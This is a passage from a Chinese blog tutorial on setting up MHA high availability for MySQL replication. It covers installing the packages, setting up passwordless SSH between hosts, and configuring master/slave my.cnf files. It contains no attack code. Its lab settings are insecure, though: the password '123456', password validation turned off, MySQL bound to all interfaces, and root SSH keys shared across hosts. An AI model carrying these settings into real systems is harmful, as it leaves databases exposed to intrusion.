id="1-&#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA"><a href="#1-&#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA" class="headerlink" title="1. &#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA"></a>1. &#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA</h2><p>&#x63A5;&#x4E0B;&#x6765;&#x90E8;&#x7F72;MHA&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x642D;&#x5EFA;&#x73AF;&#x5883;&#x5982;&#x4E0B;&#xFF08;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E3A;2&#x53F0;CentOS7.4 64bit&#xFF0C;2&#x53F0;RHEL7.3 64bit&#xFF09;</p><table><thead><tr><th>&#x89D2;&#x8272;</th><th>IP&#x5730;&#x5740;</th><th>&#x4E3B;&#x673A;&#x540D;</th><th>&#x5DE5;&#x5177;</th><th>&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</th></tr></thead><tbody><tr><td>manager</td><td>192.168.73.20</td><td>ctos7mini</td><td>mha4mysql-manager,mha4mysql-node</td><td>CentOS7.4 x64</td></tr><tr><td>master</td><td>192.168.73.21</td><td>rhel7</td><td>mha4mysql-node</td><td>RHEL7.3 x64</td></tr><tr><td>slave,candicate master</td><td>192.168.73.22</td><td>rhel_sqlsrv</td><td>mha4mysql-node</td><td>RHEL7.3 x64</td></tr><tr><td>slave</td><td>192.168.73.23</td><td>ctos_sqlsrv</td><td>mha4mysql-node</td><td>CentOS7.4 x64</td></tr></tbody></table><p>&#x5176;&#x4E2D;master&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x5199;&#x670D;&#x52A1;&#xFF0C;&#x5907;&#x9009;Candicate master&#xFF08;&#x5B9E;&#x9645;&#x4E3A;slave1&#xFF09;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;slave2&#x4E5F;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x65E6;master&#x5B95;&#x673A;&#xFF0C;&#x5C06;&#x4F1A;&#x628A;&#x5907;&#x9009;master&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;slave&#x6307;&#x5411;&#x65B0;&#x7684;master</p><p><strong>&#xFF08;1&#xFF09;&#x5728;&#x5B89;&#x88C5;MHA&#x5DE5;&#x5177;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x8981;&#x5B89;&#x88C5;epel&#x6E90;&#xFF0C;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898;&#xFF1A;</strong></p><p>Centos6&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm&#xFF08;&#x5DF2;&#x5931;&#x6548;&#xFF0C;&#x5B98;&#x65B9;&#x4E0D;&#x518D;&#x652F;&#x6301;&#xFF09;" target="_blank" rel="noopener">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm&#xFF08;&#x5DF2;&#x5931;&#x6548;&#xFF0C;&#x5B98;&#x65B9;&#x4E0D;&#x518D;&#x652F;&#x6301;&#xFF09;</a><br>Centos7&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-14.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-14.noarch.rpm</a><br>Centos8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;8&#x4EE5;&#x4E0A;&#x9700;&#x8981;&#x5B89;&#x88C5;2&#x4E2A;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-release-8-15.el8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-release-8-15.el8.noarch.rpm</a><br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-next-release-8-15.el8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-next-release-8-15.el8.noarch.rpm</a>  </p><p>Centos9&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-release-9-2.el9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-release-9-2.el9.noarch.rpm</a><br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-next-release-9-2.el9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-next-release-9-2.el9.noarch.rpm</a>  </p><p>RHEL7&#x5B89;&#x88C5;&#x6E90;&#xFF1A;yum install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</a><br>RHEL8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm</a><br>RHEL9-Beta&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm</a>  </p><p>MHA Manager&#x4E2D;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E86;&#x51E0;&#x4E2A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x4F8B;&#x5982;master_manger&#xFF0C;master_master_switch&#x7B49;&#xFF1B;MHA Manger&#x4E5F;&#x4F9D;&#x8D56;&#x4E8E;perl&#x6A21;&#x5757;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#xFF08;1&#xFF09;&#x5B89;&#x88C5;MHA Node&#x8F6F;&#x4EF6;&#x5305;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B8C;&#x6210;&#xFF0C;&#x9996;&#x5148;epel&#x6E90;&#x8981;&#x5B89;&#x88C5;&#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x624D;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;epel&#x6E90;</p><p>&#xFF08;2&#xFF09;&#x5B89;&#x88C5;MHA Manager &#x9996;&#x5148;&#x5B89;&#x88C5;MHA Manger&#x4F9D;&#x8D56;&#x7684;perl&#x6A21;&#x5757;&#xFF08;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#xFF09;&#xFF1A;</p><p>&#x5728;&#x6240;&#x6709;&#x673A;&#x5668;&#x4E0A;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#x5168;&#x90E8;&#x4F9D;&#x8D56;</p><pre><code>yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker perl-CPAN -y</code></pre><p><strong>&#x6CE8;&#xFF01;</strong>&#x5728;RHEL&#x7CFB;&#x7EDF;&#x4E2D;&#x5B89;&#x88C5;&#x4E86;epel&#x6E90;&#x4E4B;&#x540E;&#x4F9D;&#x65E7;&#x4F1A;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898;</p><p><strong>&#xFF08;2&#xFF09;&#x83B7;&#x53D6;MHA&#x76F8;&#x5173;&#x5305;&#xFF0C;&#x5728;&#x6240;&#x6709;&#x7684;&#x8282;&#x70B9;&#x5B89;&#x88C5;mha-node&#xFF1A;</strong></p><p>&#x76F8;&#x5173;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<br>&#x963F;&#x91CC;&#x4E91;&#x76D8;&#x5206;&#x4EAB;&#xFF1A;<a href="https://www.aliyundrive.com/s/cMNxKg6srT6" target="_blank" rel="noopener">https://www.aliyundrive.com/s/cMNxKg6srT6</a><br>mha_manager_0.55 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-1.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-1.el5.noarch.rpm</a><br>mha_manager_0.55 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-0.el6.noarch.rpm</a>  </p><p>mha_manager_0.54 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el5.noarch.rpm</a><br>mha_manager_0.54 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el6.noarch.rpm</a>  </p><p>mha_node_0.54 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-1.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-1.el5.noarch.rpm</a><br>mha_node_0.54 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-0.el6.noarch.rpm</a>  </p><p>mha_node&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin/&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; rpm -ivh mha4mysql-node-0.54-0.el6.noarch.rpm</span><br><span class="line">[root@ctos7mini ~]&amp; cd /usr/bin/</span><br><span class="line">[root@ctos7mini bin]&amp; ll app* filter* purge* save*</span><br><span class="line">-rwxr-xr-x. 1 root root 15977 Dec  1  2012 apply_diff_relay_logs</span><br><span class="line">-rwxr-xr-x. 1 root root  4807 Dec  1  2012 filter_mysqlbinlog</span><br><span class="line">-rwxr-xr-x. 1 root root  7401 Dec  1  2012 purge_relay_logs</span><br><span class="line">-rwxr-xr-x. 1 root root  7263 Dec  1  2012 save_binary_logs</span><br><span class="line">[root@ctos7mini bin]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#xFF08;3&#xFF09;&#x5B89;&#x88C5;MHA Manager</strong></p><p>&#x5B89;&#x88C5;MHA Manager&#x8F6F;&#x4EF6;&#x5305;&#xFF1A;<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mysql_master_ha]# rpm -ivh mha4mysql-manager-0.54-0.el6.noarch.rpm</span><br><span class="line">Preparing...                          ################################# [100%]</span><br><span class="line">Updating / installing...</span><br><span class="line">   1:mha4mysql-manager-0.54-0.el6     ################################# [100%]</span><br><span class="line">[root@ctos7mini mysql_master_ha]#</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6CE8;&#x610F;&#xFF01;</strong> &#x5982;&#x679C;&#x5728;RHEL&#x4E0A;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x65E0;&#x6CD5;&#x5B89;&#x88C5;MHA Manager&#xFF0C;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#xFF0C;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5B89;&#x88C5;<code>perl-Config-Tiny</code><br>&#x9700;&#x8981;&#x5728;rhel&#x7CFB;&#x7EDF;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#xFF1A;  </p><pre><code>rpm -ivh http://mirror.centos.org/centos/7/os/x86_64/Packages/perl-Config-Tiny-2.14-7.el7.noarch.rpm</code></pre><p>MHA Manager&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E9B;&#x811A;&#x672C;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x91CD;&#x590D;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mysql_master_ha]&amp;ll /usr/bin/mast*</span><br><span class="line">-rwxr-xr-x. 1 root root 1995 Dec  1  2012 /usr/bin/masterha_check_repl</span><br><span class="line">-rwxr-xr-x. 1 root root 1779 Dec  1  2012 /usr/bin/masterha_check_ssh</span><br><span class="line">-rwxr-xr-x. 1 root root 1865 Dec  1  2012 /usr/bin/masterha_check_status</span><br><span class="line">-rwxr-xr-x. 1 root root 3201 Dec  1  2012 /usr/bin/masterha_conf_host</span><br><span class="line">-rwxr-xr-x. 1 root root 2517 Dec  1  2012 /usr/bin/masterha_manager</span><br><span class="line">-rwxr-xr-x. 1 root root 2165 Dec  1  2012 /usr/bin/masterha_master_monitor</span><br><span class="line">-rwxr-xr-x. 1 root root 2373 Dec  1  2012 /usr/bin/masterha_master_switch</span><br><span class="line">-rwxr-xr-x. 1 root root 3879 Dec  1  2012 /usr/bin/masterha_secondary_check</span><br><span class="line">-rwxr-xr-x. 1 root root 1739 Dec  1  2012 /usr/bin/masterha_stop</span><br><span class="line">[root@ctos7mini mysql_master_ha]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#xFF08;4&#xFF09;&#x914D;&#x7F6E;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x76F8;&#x4E92;SSH&#x767B;&#x5F55;&#x65E0;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#xFF08;&#x4F7F;&#x7528;key&#x767B;&#x5F55;&#xFF0C;&#x5DE5;&#x4F5C;&#x4E2D;&#x5E38;&#x7528;&#xFF09;</strong><br>&#x6709;&#x4E00;&#x70B9;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x80FD;&#x7981;&#x6B62; password &#x767B;&#x9646;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF;</p><p>&#x5728;&#x6240;&#x6709;&#x4E3B;&#x673A;&#x4E0A;&#x914D;&#x7F6E;ssh&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# ssh-keygen -t rsa</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): &#x56DE;&#x8F66;</span><br><span class="line">Enter passphrase (empty for no passphrase): &#x56DE;&#x8F66;</span><br><span class="line">Enter same passphrase again: &#x56DE;&#x8F66;</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">c2:95:fa:7e:f5:ef:07:3f:70:a2:ec:bb:3a:5a:9f:d9 root@rhel7</span><br><span class="line">The key&apos;s randomart image is:</span><br><span class="line">+--[ RSA 2048]----+</span><br><span class="line">|                 |</span><br><span class="line">|         .       |</span><br><span class="line">|        o        |</span><br><span class="line">|     . o         |</span><br><span class="line">|      + S        |</span><br><span class="line">|       o    .o.. |</span><br><span class="line">|        ......+o |</span><br><span class="line">|       ...oo+ ..o|</span><br><span class="line">|       .oo+BoE o=|</span><br><span class="line">+-----------------+</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.20</span><br><span class="line">[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.22</span><br><span class="line">[root@rhel7 ~]&amp; ssh-copy-id root@192.168.73.23</span><br></pre></td></tr></tbody></table></figure><p>&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;</p><p><strong>ssh&#x914D;&#x7F6E;&#x6269;&#x5C55;</strong></p><blockquote><p>&#x89E3;&#x51B3;rhel&#x8FDE;&#x63A5;ssh&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x8FC7;&#x4E45;&#x7684;&#x95EE;&#x9898;</p></blockquote><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x53BB;&#x6389;&#x6CE8;&#x91CA;&#xFF0C;&#x6539;&#x4E3A;no</span></span><br><span class="line">UseDNS no</span><br></pre></td></tr></tbody></table></figure><h2 id="2-&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;"><a href="#2-&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;" class="headerlink" title="2. &#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;"></a>2. &#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x73AF;&#x5883;</h2><p>&#x6CE8;&#x610F;&#xFF1A;binlog-do-db &#x548C; replicate-ignore-db &#x8BBE;&#x7F6E;&#x5FC5;&#x987B;&#x76F8;&#x540C;&#xFF1B;MHA &#x5728;&#x542F;&#x52A8;&#x65F6;&#x5019;&#x4F1A;&#x68C0;&#x6D4B;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x679C;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x4E0D;&#x540C;&#xFF0C;MHA &#x4E0D;&#x542F;&#x52A8;&#x76D1;&#x63A7;&#x548C;&#x6545;&#x969C;&#x8F6C;&#x79FB;</p><h3 id="&#x5728;192-168-73-21&#x4E0A;&#x914D;&#x7F6E;MySQL-master"><a href="#&#x5728;192-168-73-21&#x4E0A;&#x914D;&#x7F6E;MySQL-master" class="headerlink" title="&#x5728;192.168.73.21&#x4E0A;&#x914D;&#x7F6E;MySQL master"></a>&#x5728;192.168.73.21&#x4E0A;&#x914D;&#x7F6E;MySQL master</h3><p><strong>&#x521B;&#x5EFA;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br><span class="line">mysql&gt; CREATE DATABASE ha DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line">mysql&gt; use HA;</span><br><span class="line">mysql&gt; CREATE TABLE test(id int,name varchar(20));</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong><br></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;</span></span><br><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin-master</span><br><span class="line"><span class="comment"># &#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID&#x6807;&#x8BC6;</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">1</span></span><br><span class="line"><span class="comment"># &#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=ha</span><br><span class="line"><span class="comment"># &#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;</span></span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x53EF;&#x9009;]&#x81EA;MySQL5.6&#x7248;&#x672C;&#xFF0C;&#x5F15;&#x5165;&#x4E86;&#x65B0;&#x5BC6;&#x7801;&#x6821;&#x9A8C;&#x63D2;&#x4EF6;validate_password, &#x7528;&#x4E8E;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x957F;&#x5EA6;&#x3001;&#x5F3A;&#x5EA6;&#x7B49;&#xFF0C;&#x4FDD;&#x969C;&#x8D26;&#x53F7;&#x7684;&#x5B89;&#x5168;&#x6027;</span></span><br><span class="line"><span class="attr">validate-password</span>=<span class="literal">off</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6587;&#x6863;&#xFF1A;&#x5B89;&#x88C5;validate_password&#x63D2;&#x4EF6;.md<br><a href="http://note.youdao.com/noteshare?id=3808ed864a33805181a8cbea885a6784&amp;sub=02140C7F57F9404499D06E2EF7006296" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=3808ed864a33805181a8cbea885a6784&amp;sub=02140C7F57F9404499D06E2EF7006296</a></p><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;&#x72B6;&#x6001;&#x4FE1;&#x606F;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File                    | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mysql-bin-master.000001 |      154 | ha           | mysql            |                   |</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x5728;192-168-73-22&#x4E0A;&#x914D;&#x7F6E;MySQL-slave"><a href="#&#x5728;192-168-73-22&#x4E0A;&#x914D;&#x7F6E;MySQL-slave" class="headerlink" title="&#x5728;192.168.73.22&#x4E0A;&#x914D;&#x7F6E;MySQL slave"></a>&#x5728;192.168.73.22&#x4E0A;&#x914D;&#x7F6E;MySQL slave</h3><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave1</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=ha</span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"><span class="comment">#&#x53EA;&#x6709;&#x5F00;&#x542F;log_slave_updates&#xFF0C;&#x4ECE;&#x5E93;binlog&#x624D;&#x4F1A;&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;</span></span><br><span class="line"><span class="attr">log_slave_updates</span>=<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 